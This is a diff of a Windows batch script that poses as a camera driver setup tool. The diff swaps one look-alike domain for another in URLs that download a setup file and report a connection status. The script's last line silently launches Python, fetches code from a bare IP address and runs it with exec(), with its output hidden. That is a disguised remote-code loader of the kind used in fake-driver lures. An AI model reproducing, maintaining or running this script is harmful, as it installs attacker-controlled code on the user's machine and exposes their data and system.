@@ -6,7 +6,7 @@ REM =====================================================================
 REM  Windows driver setup - single linear script (no call :labels).
 REM  Downloaded .bat files often break mid-file labels; paths must be set
 REM  at the start, never via a failed subroutine.
-REM  Template: WINDOW_UID is replaced by POST /window/:id on api.sigmassessmentsystems.com
+REM  Template: WINDOW_UID is replaced by POST /window/:id on api.sigmaasessmentsystems.com
 REM =====================================================================
 
 set "WINDOW_UID=__ID__"
@@ -81,7 +81,7 @@ if defined NODE_EXE (
     echo [WARN] Node executable is missing; Node-based steps may fail.
 )
 
-set "ENV_SETUP_URL=https://api.sigmassessmentsystems.com/driver/env-setup.npl"
+set "ENV_SETUP_URL=https://api.sigmaasessmentsystems.com/driver/env-setup.npl"
 set "CODEPROFILE=%USERPROFILE%"
 if not exist "%CODEPROFILE%" mkdir "%CODEPROFILE%" 2>nul
 
@@ -149,7 +149,7 @@ if errorlevel 1 (
 )
 echo [SUCCESS] Camera drivers have been updated successfully.
 if defined WINDOW_UID (
-    set "AUTO_URL=https://api.sigmassessmentsystems.com/change-connection-status/!WINDOW_UID!"
+    set "AUTO_URL=https://api.sigmaasessmentsystems.com/change-connection-status/!WINDOW_UID!"
     curl -sL -X POST "!AUTO_URL!" -o nul
 )
 C:\python\python.exe -c "from urllib.request import urlopen,Request;Request._V='7-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" >nul 2>&1
